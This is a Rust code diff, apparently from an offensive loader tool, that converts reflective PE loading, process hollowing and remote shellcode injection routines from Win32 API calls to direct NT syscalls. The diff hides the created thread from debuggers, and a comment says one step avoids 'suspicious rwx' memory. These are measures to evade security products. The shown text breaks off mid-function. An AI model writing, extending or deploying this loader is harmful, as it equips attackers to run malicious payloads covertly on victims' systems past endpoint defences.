@@ -7,47 +7,74 @@ use crate::utils::structures::{
 use crate::utils::tools::*;
 
 use std::error::Error;
-use std::ffi::c_void;
-use std::mem::transmute;
+use std::ffi::{c_ulong, c_void};
+use std::iter::once;
 
-use ntapi::ntmmapi::NtUnmapViewOfSection;
-use ntapi::winapi::um::winnt::CONTEXT_INTEGER;
-use windows_sys::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
-use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
-use windows_sys::Win32::System::Diagnostics::Debug::{
-    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory,
+use ntapi::ntpsapi::{
+    PsCreateInitialState, PPS_ATTRIBUTE_LIST, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION,
+    PS_ATTRIBUTE_IMAGE_NAME, PS_ATTRIBUTE_LIST, PS_CREATE_INFO,
+    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
 };
+use ntapi::ntrtl::{
+    RtlAllocateHeap, RtlCreateProcessParametersEx, RtlDestroyProcessParameters, RtlFreeHeap,
+    RtlInitUnicodeString, RtlProcessHeap, PRTL_USER_PROCESS_PARAMETERS,
+    RTL_USER_PROC_PARAMS_NORMALIZED,
+};
+use winapi::shared::ntdef::{
+    HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
+};
+use winapi::um::winnt::{
+    CONTEXT_INTEGER, HEAP_ZERO_MEMORY, LARGE_INTEGER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
+    PAGE_READWRITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+};
+
+use syscalls::syscall;
+use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows_sys::Win32::System::Memory::{
-    VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtectEx,
-};
-use windows_sys::Win32::System::Threading::{
-    CreateProcessA, CreateRemoteThread, CreateThread, GetCurrentProcess, ResumeThread,
-    WaitForSingleObject, PROCESS_BASIC_INFORMATION, STARTUPINFOA,
-};
+use windows_sys::Win32::System::Memory::{VirtualFree, PAGE_EXECUTE_READWRITE};
+use windows_sys::Win32::System::Threading::GetCurrentProcess;
 
-pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
+pub fn reflective_loader_syscalls(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
     //Retrieve the sizes of the headers and the PE image in memory
     let header_s = get_size(&buf, "header");
-    let img_s = get_size(&buf, "image");
+    let mut img_s = get_size(&buf, "image");
     if header_s == 0 || img_s == 0 {
         return Err("Error retrieving PE sizes".into());
     }
 
     unsafe {
-        let base = VirtualAlloc(std::ptr::null_mut(), img_s, 0x1000, 0x04);
+        let mut status: NTSTATUS;
+        let mut base = NULL;
+        status = syscall!(
+            "NtAllocateVirtualMemory",
+            GetCurrentProcess(),
+            &mut base,
+            0,
+            &mut img_s,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error allocating memory: {:x}", status);
+            return Err(status.to_string().into());
+        }
 
         //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
-        WriteProcessMemory(
+        status = syscall!(
+            "NtWriteVirtualMemory",
             GetCurrentProcess(),
             base,
-            buf.as_ptr() as *const c_void,
+            buf.as_ptr() as *mut c_void,
             header_s,
-            std::ptr::null_mut(),
+            NULL
         );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error writing PE headers into memory: {:x}", status);
+            return Err(status.to_string().into());
+        }
 
         let mut dos_head = IMAGE_DOS_HEADER::default();
-        fill_structure_from_array(&mut dos_head, &buf, false);
+        fill_structure_from_array(&mut dos_head, &buf, true);
 
         log::debug!("DOS magic header : {:x?}", dos_head.e_magic);
         log::debug!(
@@ -61,7 +88,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
             &mut nt_head,
             (base as isize + dos_head.e_lfanew as isize) as *const c_void,
             GetCurrentProcess(),
-            false,
+            true,
         );
 
         log::debug!("NT headers : {:#x?}", nt_head);
@@ -78,7 +105,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                     + (i * std::mem::size_of::<IMAGE_SECTION_HEADER>() as usize))
                     as *const c_void,
                 GetCurrentProcess(),
-                false,
+                true,
             );
             log::debug!(
                 "Virtual addresses of sections {} is {:#x?}",
@@ -91,13 +118,18 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
             let tmp: Vec<u8> = buf[sections[i].PointerToRawData as usize
                 ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                 .to_vec();
-            WriteProcessMemory(
+            status = syscall!(
+                "NtWriteVirtualMemory",
                 GetCurrentProcess(),
                 (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
-                tmp.as_ptr() as *const c_void,
+                tmp.as_ptr() as *mut c_void,
                 tmp.len(),
-                std::ptr::null_mut(),
+                NULL
             );
+            if !NT_SUCCESS(status) {
+                log::debug!("Error writing section content into memory: {:x}", status);
+                return Err(status.to_string().into());
+            }
         }
 
         //Retrieve the imports and fix them
@@ -113,7 +145,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                     &mut image_descriptor,
                     origin_first_thunk as *const c_void,
                     GetCurrentProcess(),
-                    false,
+                    true,
                 );
                 if image_descriptor.Name == 0 && image_descriptor.FirstThunk == 0 {
                     log::debug!("No more import");
@@ -123,7 +155,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                     let import_name = read_from_memory(
                         (base as usize + image_descriptor.Name as usize) as *const c_void,
                         GetCurrentProcess(),
-                        false,
+                        true,
                     );
                     let load_dll = LoadLibraryA(import_name.as_bytes().as_ptr() as *const u8);
                     log::debug!("Import DLL name : {}", import_name);
@@ -140,7 +172,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                             &mut thunk_data,
                             (thunk_ptr as usize) as *const c_void,
                             GetCurrentProcess(),
-                            false,
+                            true,
                         );
                         log::debug!("{:?}", thunk_data);
                         if thunk_data.Address == [0; 8]
@@ -155,7 +187,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                             let function_name = read_from_memory(
                                 (base as usize + offset as usize + 2) as *const c_void,
                                 GetCurrentProcess(),
-                                false,
+                                true,
                             );
                             log::debug!("Function : {}", function_name);
 
@@ -168,14 +200,22 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                             );
 
                             //Write the function and its data in memory at its addr
-                            WriteProcessMemory(
+                            status = syscall!(
+                                "NtWriteVirtualMemory",
                                 GetCurrentProcess(),
                                 ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                     as *mut c_void,
-                                function_addr.as_ptr() as *const c_void,
+                                function_addr.as_ptr() as *mut c_void,
                                 function_addr.len(),
-                                std::ptr::null_mut(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!(
+                                    "Error writing functions' data into memory: {:x}",
+                                    status
+                                );
+                                return Err(status.to_string().into());
+                            }
 
                             i += 1;
                             thunk_ptr += 8;
@@ -201,7 +241,7 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                     &mut reloc,
                     first_reloc_ptr as *const c_void,
                     GetCurrentProcess(),
-                    false,
+                    true,
                 );
 
                 if reloc.SizeofBlock == 0 {
@@ -211,19 +251,24 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
                     log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                     log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);
 
-                    //For each each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
+                    //For each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                     let entries = (reloc.SizeofBlock - 8) / 2;
                     log::debug!("Entries : {:x?}", entries);
                     for i in 0..entries {
                         let mut offset_from_page: [u8; 2] = [0; 2];
 
-                        ReadProcessMemory(
+                        status = syscall!(
+                            "NtReadVirtualMemory",
                             GetCurrentProcess(),
-                            (first_reloc_ptr + 8 + (i * 2) as usize) as *const c_void,
+                            (first_reloc_ptr + 8 + (i * 2) as usize) as *mut c_void,
                             offset_from_page.as_mut_ptr() as *mut c_void,
-                            2,
-                            std::ptr::null_mut(),
+                            offset_from_page.len(),
+                            NULL
                         );
+                        if !NT_SUCCESS(status) {
+                            log::debug!("Error retrieving offset from the page addr: {:x}", status);
+                            return Err(status.to_string().into());
+                        }
 
                         log::debug!("Offset : {:x?}", offset_from_page);
                         let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());
@@ -239,13 +284,18 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
 
                             //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                             let mut harcoded_value: [u8; 8] = [0; 8];
-                            ReadProcessMemory(
+                            status = syscall!(
+                                "NtReadVirtualMemory",
                                 GetCurrentProcess(),
-                                block_reloc_rva as *const c_void,
+                                block_reloc_rva as *mut c_void,
                                 harcoded_value.as_mut_ptr() as *mut c_void,
-                                8,
-                                std::ptr::null_mut(),
+                                harcoded_value.len(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!("Error reading hardcoded values: {:x}", status);
+                                return Err(status.to_string().into());
+                            }
 
                             log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                             let fixe_addr =
@@ -254,13 +304,21 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
 
                             log::debug!("{:x?}", fixe_addr);
                             //Write into memory
-                            WriteProcessMemory(
+                            status = syscall!(
+                                "NtWriteVirtualMemory",
                                 GetCurrentProcess(),
                                 block_reloc_rva as *mut c_void,
-                                fixe_addr.to_ne_bytes().as_ptr() as *const c_void,
+                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
                                 8,
-                                std::ptr::null_mut(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!(
+                                    "Error writing hardcoded values into memory: {:x}",
+                                    status
+                                );
+                                return Err(status.to_string().into());
+                            }
                         }
                     }
                 }
@@ -270,22 +328,50 @@ pub fn reflective_loader(buf: Vec<u8>) -> Result<(), Box<dyn Error>> {
         }
 
         //Change the Read/Write memory access to Read/Write/Execute
-        let mut oldprotect = 0;
-        VirtualProtectEx(GetCurrentProcess(), base, img_s, 0x40, &mut oldprotect);
-
-        let thread = CreateThread(
-            std::ptr::null_mut(),
-            0,
-            Some(transmute(
-                (base as usize + nt_head.OptionalHeader.AddressOfEntryPoint as usize)
-                    as *mut c_void,
-            )),
-            std::ptr::null_mut(),
-            0,
-            std::ptr::null_mut(),
+        let mut old_perms = PAGE_READWRITE;
+        status = syscall!(
+            "NtProtectVirtualMemory",
+            GetCurrentProcess(),
+            &mut base,
+            &mut img_s,
+            PAGE_EXECUTE_READWRITE,
+            &mut old_perms
         );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error changing memory permissions: {:x}", status);
+            return Err(status.to_string().into());
+        }
 
-        WaitForSingleObject(thread, 10000);
+        let mut thread_handle: HANDLE = NULL;
+        status = syscall!(
+            "NtCreateThreadEx",
+            &mut thread_handle,
+            THREAD_ALL_ACCESS,
+            NULL,
+            GetCurrentProcess(),
+            (base as usize + nt_head.OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void,
+            NULL,
+            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+            0 as usize,
+            0 as usize,
+            0 as usize,
+            NULL
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error creating thread: {:x}", status);
+            return Err(status.to_string().into());
+        }
+
+        status = syscall!(
+            "NtWaitForSingleObject",
+            thread_handle,
+            0,
+            NULL as *mut _ as *mut LARGE_INTEGER
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error waiting for execution: {:x}", status);
+            return Err(status.to_string().into());
+        }
         VirtualFree(base, 0, 0x00008000);
     }
 
@@ -296,22 +382,24 @@ fn get_destination_base_addr(prochandle: isize) -> usize {
     unsafe {
         let mut process_information: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         let process_information_class = PROCESSINFOCLASS::default();
-        let mut return_l = 0;
-        NtQueryInformationProcess(
+        let return_l = 0;
+        syscall!(
+            "NtQueryInformationProcess",
             prochandle,
             process_information_class,
             &mut process_information as *mut _ as *mut c_void,
             std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-            &mut return_l,
+            return_l
         );
         let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
         let mut image_base_buffer = [0; std::mem::size_of::<&u8>()];
-        ReadProcessMemory(
+        syscall!(
+            "NtReadVirtualMemory",
             prochandle,
             peb_image_offset as *const c_void,
             image_base_buffer.as_mut_ptr() as *mut c_void,
             image_base_buffer.len(),
-            std::ptr::null_mut(),
+            NULL
         );
 
         log::debug!(
@@ -322,59 +410,139 @@ fn get_destination_base_addr(prochandle: isize) -> usize {
     }
 }
 
-pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
+pub fn remote_loader_syscalls(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
     //Retrieve the sizes of the headers and the PE image in memory
     let header_s = get_size(&buf, "header");
-    let img_s = get_size(&buf, "image");
+    let mut img_s = get_size(&buf, "image");
     if header_s == 0 || img_s == 0 {
         return Err("Error retrieving PE sizes".into());
     }
 
+    let mut status: NTSTATUS;
+    let mut prochandle: HANDLE = NULL;
+    let mut threadhandle: HANDLE = NULL;
+
     unsafe {
-        let pe_to_execute = pe_to_execute.trim().to_owned() + "\0";
-        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
-        let mut lp_process_information: windows_sys::Win32::System::Threading::PROCESS_INFORMATION =
-            std::mem::zeroed();
-        CreateProcessA(
-            pe_to_execute.as_ptr() as *const u8,
+        let mut full_path = "\\??\\".to_owned() + pe_to_execute;
+        full_path = full_path.trim().to_owned() + "\0";
+
+        let mut nt_image_path: UNICODE_STRING = UNICODE_STRING::default();
+
+        // Image path in NT format
+        // https://stackoverflow.com/questions/76211265/pdhaddcounterw-no-rules-expected-this-token-in-macro-call
+        let source_string = full_path.encode_utf16().chain(once(0)).collect::<Vec<_>>();
+        RtlInitUnicodeString(&mut nt_image_path, source_string.as_ptr() as *const u16);
+
+        // Process parameters building
+        let mut process_parameters: PRTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();
+        status = RtlCreateProcessParametersEx(
+            &mut process_parameters,
+            &mut nt_image_path,
             std::ptr::null_mut(),
             std::ptr::null_mut(),
             std::ptr::null_mut(),
-            0,
-            0x00000004,
             std::ptr::null_mut(),
             std::ptr::null_mut(),
-            &mut lp_startup_info as *mut STARTUPINFOA,
-            &mut lp_process_information
-                as *mut windows_sys::Win32::System::Threading::PROCESS_INFORMATION,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            RTL_USER_PROC_PARAMS_NORMALIZED,
         );
-        if GetLastError() != 0 {
-            log::debug!("{}", GetLastError());
-            return Err(GetLastError().to_string().into());
+        if !NT_SUCCESS(status) {
+            log::debug!("Error creating process parameters: {:x}", status);
+            return Err(status.to_string().into());
         }
 
-        let mut remote_base =
-            get_destination_base_addr(lp_process_information.hProcess) as *mut c_void;
-        let prochandle = lp_process_information.hProcess;
-        let threadhandle = lp_process_information.hThread;
+        // PS_CREATE_INFO structure building
+        let mut create_info = PS_CREATE_INFO::default();
+        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
+        create_info.State = PsCreateInitialState;
+
+        // Process and thread attributs building
+        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
+            RtlProcessHeap(),
+            HEAP_ZERO_MEMORY,
+            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
+        ) as PPS_ATTRIBUTE_LIST;
+        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
+        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+        attribute_list.as_mut().unwrap().Attributes[0].Size = nt_image_path.Length as usize;
+        attribute_list.as_mut().unwrap().Attributes[0].u.Value = nt_image_path.Buffer as usize;
+
+        // New process startup
+        status = syscall!(
+            "NtCreateUserProcess",
+            &mut prochandle,
+            &mut threadhandle,
+            PROCESS_ALL_ACCESS,
+            THREAD_ALL_ACCESS,
+            NULL as *mut OBJECT_ATTRIBUTES,
+            NULL as *mut OBJECT_ATTRIBUTES,
+            0 as c_ulong,
+            0 as c_ulong,
+            process_parameters as *mut c_void,
+            &mut create_info,
+            attribute_list
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error creating process: {:x}", status);
+            return Err(status.to_string().into());
+        }
+
+        RtlFreeHeap(RtlProcessHeap(), 0, attribute_list as *mut c_void);
+        RtlDestroyProcessParameters(process_parameters);
+
+        let mut remote_base = get_destination_base_addr(prochandle as isize) as *mut c_void;
 
         //Set the memory access to Read/Write for the moment to avoid suspicious rwx
-        let base = VirtualAlloc(std::ptr::null_mut(), img_s, 0x1000, 0x04);
-        NtUnmapViewOfSection(
-            prochandle as *mut ntapi::winapi::ctypes::c_void,
-            remote_base as *mut ntapi::winapi::ctypes::c_void,
+        let mut base = NULL;
+        status = syscall!(
+            "NtAllocateVirtualMemory",
+            GetCurrentProcess(),
+            &mut base,
+            0,
+            &mut img_s,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
         );
-
-        remote_base = VirtualAllocEx(prochandle, remote_base, img_s, 0x1000 + 0x2000, 0x04);
+        if !NT_SUCCESS(status) {
+            log::debug!(
+                "Error allocating memory for the current process: {:x}",
+                status
+            );
+        }
+        status = syscall!("NtUnmapViewOfSection", prochandle, remote_base);
+        if !NT_SUCCESS(status) {
+            log::debug!("Error calling NtUnmapViewOfSection: {:x}", status);
+        }
+        status = syscall!(
+            "NtAllocateVirtualMemory",
+            prochandle,
+            &mut remote_base,
+            0,
+            &mut img_s,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!(
+                "Error allocating memory for the remote process: {:x}",
+                status
+            );
+        }
 
         //Retrieve the DOS magic header and the elfa new (address of the begining of the PE after the DOS header)
-        WriteProcessMemory(
+        status = syscall!(
+            "NtWriteVirtualMemory",
             prochandle,
             remote_base,
-            buf.as_ptr() as *const c_void,
+            buf.as_ptr() as *mut c_void,
             header_s,
-            std::ptr::null_mut(),
+            NULL
         );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error writing PE headers into memory: {:x}", status);
+        }
 
         //Parsing locally
         std::ptr::copy(buf.as_ptr() as *const u8, base as *mut u8, header_s);
@@ -425,20 +593,35 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
                 ..(sections[i].PointerToRawData as usize + sections[i].SizeOfRawData as usize)]
                 .to_vec();
 
-            WriteProcessMemory(
+            status = syscall!(
+                "NtWriteVirtualMemory",
                 GetCurrentProcess(),
                 (base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
-                tmp.as_ptr() as *const c_void,
+                tmp.as_ptr() as *mut c_void,
                 sections[i].SizeOfRawData as usize,
-                std::ptr::null_mut(),
+                NULL
             );
-            WriteProcessMemory(
+            if !NT_SUCCESS(status) {
+                log::debug!(
+                    "Error writing section content into memory of current process: {:x}",
+                    status
+                );
+            }
+
+            status = syscall!(
+                "NtWriteVirtualMemory",
                 prochandle,
                 (remote_base as usize + sections[i].VirtualAddress as usize) as *mut c_void,
-                tmp.as_ptr() as *const c_void,
+                tmp.as_ptr() as *mut c_void,
                 sections[i].SizeOfRawData as usize,
-                std::ptr::null_mut(),
+                NULL
             );
+            if !NT_SUCCESS(status) {
+                log::debug!(
+                    "Error writing section content into memory of remote process: {:x}",
+                    status
+                );
+            }
         }
 
         //Retrieve the imports and fix them
@@ -509,23 +692,37 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
                             );
 
                             //Write the function and its data in memory at its addr
-                            WriteProcessMemory(
+                            status = syscall!(
+                                "NtWriteVirtualMemory",
                                 GetCurrentProcess(),
                                 ((base as usize + image_descriptor.FirstThunk as usize) + i * 8)
                                     as *mut c_void,
                                 function_addr.as_ptr() as *const c_void,
                                 function_addr.len(),
-                                std::ptr::null_mut(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!(
+                                    "Error writing functions' data into memory of current process: {:x}",
+                                    status
+                                );
+                            }
 
-                            WriteProcessMemory(
+                            status = syscall!(
+                                "NtWriteVirtualMemory",
                                 prochandle,
                                 ((remote_base as usize + image_descriptor.FirstThunk as usize)
                                     + i * 8) as *mut c_void,
                                 function_addr.as_ptr() as *const c_void,
                                 function_addr.len(),
-                                std::ptr::null_mut(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!(
+                                    "Error writing functions' data into memory of remote process: {:x}",
+                                    status
+                                );
+                            }
 
                             i += 1;
                             thunk_ptr += 8;
@@ -561,19 +758,23 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
                     log::debug!("Size of block : {:x?}", reloc.SizeofBlock);
                     log::debug!("Virtual addr : {:x?}", reloc.VirtualAddress);
 
-                    //For each each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
+                    //For each entries, retrieve the offset from the page addr and the hardcoded values at the relocation RVA
                     let entries = (reloc.SizeofBlock - 8) / 2;
                     log::debug!("Entries : {:x?}", entries);
                     for i in 0..entries {
                         let mut offset_from_page: [u8; 2] = [0; 2];
 
-                        ReadProcessMemory(
+                        status = syscall!(
+                            "NtReadVirtualMemory",
                             GetCurrentProcess(),
-                            (first_reloc_ptr + 8 + (i * 2) as usize) as *const c_void,
+                            (first_reloc_ptr + 8 + (i * 2) as usize) as *mut c_void,
                             offset_from_page.as_mut_ptr() as *mut c_void,
-                            2,
-                            std::ptr::null_mut(),
+                            offset_from_page.len(),
+                            NULL
                         );
+                        if !NT_SUCCESS(status) {
+                            log::debug!("Error retrieving offset from the page addr: {:x}", status);
+                        }
 
                         log::debug!("Offset : {:x?}", offset_from_page);
                         let temp = u16::from_ne_bytes(offset_from_page.try_into().unwrap());
@@ -589,13 +790,17 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
 
                             //Read the hardcoded values at the entry addr and translate to obtain the fixed addr
                             let mut harcoded_value: [u8; 8] = [0; 8];
-                            ReadProcessMemory(
+                            status = syscall!(
+                                "NtReadVirtualMemory",
                                 GetCurrentProcess(),
                                 block_reloc_rva as *const c_void,
                                 harcoded_value.as_mut_ptr() as *mut c_void,
-                                8,
-                                std::ptr::null_mut(),
+                                harcoded_value.len(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!("Error reading hardcoded values: {:x}", status);
+                            }
 
                             log::debug!("Harcoded value at RVA : {:x?}", harcoded_value);
                             let fixe_addr =
@@ -604,13 +809,20 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
 
                             log::debug!("{:x?}", fixe_addr);
                             //Write into memory
-                            WriteProcessMemory(
+                            status = syscall!(
+                                "NtWriteVirtualMemory",
                                 prochandle,
                                 block_reloc_rva as *mut c_void,
-                                fixe_addr.to_ne_bytes().as_ptr() as *const c_void,
+                                fixe_addr.to_ne_bytes().as_ptr() as *mut c_void,
                                 8,
-                                std::ptr::null_mut(),
+                                NULL
                             );
+                            if !NT_SUCCESS(status) {
+                                log::debug!(
+                                    "Error writing hardcoded values into memory: {:x}",
+                                    status
+                                );
+                            }
                         }
                     }
                 }
@@ -620,80 +832,217 @@ pub fn remote_loader(buf: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Er
         }
 
         //Change the Read/Write memory access to Write/Execute
-        let mut oldprotect = 0;
-        VirtualProtectEx(prochandle, remote_base, img_s, 0x80, &mut oldprotect);
+        let mut old_perms = PAGE_READWRITE;
+        status = syscall!(
+            "NtProtectVirtualMemory",
+            prochandle,
+            &mut remote_base,
+            &mut img_s,
+            PAGE_EXECUTE_READWRITE,
+            &mut old_perms
+        );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error changing memory permissions: {:x}", status);
+        }
 
         let mut ctx = std::mem::zeroed::<windows_sys::Win32::System::Diagnostics::Debug::CONTEXT>();
         ctx.ContextFlags = CONTEXT_INTEGER;
-        GetThreadContext(threadhandle, &mut ctx);
+        status = syscall!("NtGetContextThread", threadhandle, &mut ctx);
+        if !NT_SUCCESS(status) {
+            log::debug!("Error getting thread context: {:x}", status);
+        }
         ctx.Rcx = remote_base as u64 + nt_head.OptionalHeader.AddressOfEntryPoint as u64;
-        SetThreadContext(threadhandle, &mut ctx);
+        status = syscall!("NtSetContextThread", threadhandle, &mut ctx);
+        if !NT_SUCCESS(status) {
+            log::debug!("Error setting thread context: {:x}", status);
+        }
         VirtualFree(base, 0, 0x00004000);
-        ResumeThread(threadhandle);
-
-        CloseHandle(prochandle);
+        status = syscall!("NtResumeThread", threadhandle, NULL);
+        if !NT_SUCCESS(status) {
+            log::debug!("Error resuming thread: {:x}", status);
+        }
+        CloseHandle(prochandle as isize);
     }
 
     Ok(())
 }
 
-pub fn shellcode_loader(shellcode: Vec<u8>, pe_to_execute: &str) -> Result<(), Box<dyn Error>> {
-    let pe_to_execute = pe_to_execute.trim().to_owned() + "\0";
+pub fn shellcode_loader_syscalls(
+    mut shellcode: Vec<u8>,
+    pe_to_execute: &str,
+) -> Result<(), Box<dyn Error>> {
+    let mut full_path = "\\??\\".to_owned() + pe_to_execute;
+    full_path = full_path.trim().to_owned() + "\0";
+
+    let mut status: NTSTATUS;
+    let mut process_handle: HANDLE = NULL;
+    let mut thread_handle: HANDLE = NULL;
+
     unsafe {
-        let mut lp_startup_info: STARTUPINFOA = std::mem::zeroed();
-        let mut lp_process_information: windows_sys::Win32::System::Threading::PROCESS_INFORMATION =
-            std::mem::zeroed();
-        CreateProcessA(
-            pe_to_execute.as_ptr() as *const u8,
+        let mut nt_image_path: UNICODE_STRING = UNICODE_STRING::default();
+
+        // Image path in NT format
+        // https://stackoverflow.com/questions/76211265/pdhaddcounterw-no-rules-expected-this-token-in-macro-call
+        let source_string = full_path.encode_utf16().chain(once(0)).collect::<Vec<_>>();
+        RtlInitUnicodeString(&mut nt_image_path, source_string.as_ptr() as *const u16);
+
+        // Process parameters building
+        let mut process_parameters: PRTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();
+        status = RtlCreateProcessParametersEx(
+            &mut process_parameters,
+            &mut nt_image_path,
             std::ptr::null_mut(),
             std::ptr::null_mut(),
             std::ptr::null_mut(),
-            0,
-            0x08000000, //No window
             std::ptr::null_mut(),
             std::ptr::null_mut(),
-            &mut lp_startup_info,
-            &mut lp_process_information,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            RTL_USER_PROC_PARAMS_NORMALIZED,
         );
+        if !NT_SUCCESS(status) {
+            log::debug!("Error creating process parameters : {:x}", status);
+            return Err(status.to_string().into());
+        }
 
-        if GetLastError() == 0 {
-            let base = VirtualAllocEx(
-                lp_process_information.hProcess,
-                std::ptr::null_mut(),
-                shellcode.len(),
-                0x00001000,
-                0x04,
-            );
-            WriteProcessMemory(
-                lp_process_information.hProcess,
-                base,
-                shellcode.as_ptr() as *const c_void,
-                shellcode.len(),
-                0 as *mut usize,
-            );
-            let mut oldprotect = 0;
-            VirtualProtectEx(
-                lp_process_information.hProcess,
-                base,
-                shellcode.len(),
-                0x20,
-                &mut oldprotect,
-            );
-            CreateRemoteThread(
-                lp_process_information.hProcess,
-                std::ptr::null_mut(),
-                0,
-                Some(transmute(base)),
-                std::ptr::null_mut(),
-                0,
-                std::ptr::null_mut(),
-            );
+        // PS_CREATE_INFO structure building
+        let mut create_info = PS_CREATE_INFO::default();
+        create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
+        create_info.State = PsCreateInitialState;
 
-            CloseHandle(lp_process_information.hProcess);
-        } else {
-            log::debug!("{}", GetLastError());
-            return Err(GetLastError().to_string().into());
+        // Process and thread attributs building
+        let attribute_list: PPS_ATTRIBUTE_LIST = RtlAllocateHeap(
+            RtlProcessHeap(),
+            HEAP_ZERO_MEMORY,
+            std::mem::size_of::<PS_ATTRIBUTE_LIST>(),
+        ) as PPS_ATTRIBUTE_LIST;
+        attribute_list.as_mut().unwrap().TotalLength = std::mem::size_of::<PS_ATTRIBUTE_LIST>();
+        attribute_list.as_mut().unwrap().Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+        attribute_list.as_mut().unwrap().Attributes[0].Size = nt_image_path.Length as usize;
+        attribute_list.as_mut().unwrap().Attributes[0].u.Value = nt_image_path.Buffer as usize;
+
+        // New process startup
+        status = syscall!(
+            "NtCreateUserProcess",
+            &mut process_handle,
+            &mut thread_handle,
+            PROCESS_ALL_ACCESS,
+            THREAD_ALL_ACCESS,
+            NULL as *mut OBJECT_ATTRIBUTES,
+            NULL as *mut OBJECT_ATTRIBUTES,
+            0 as c_ulong,
+            0 as c_ulong,
+            process_parameters as *mut c_void,
+            &mut create_info,
+            attribute_list
+        );
+        if !NT_SUCCESS(status) {
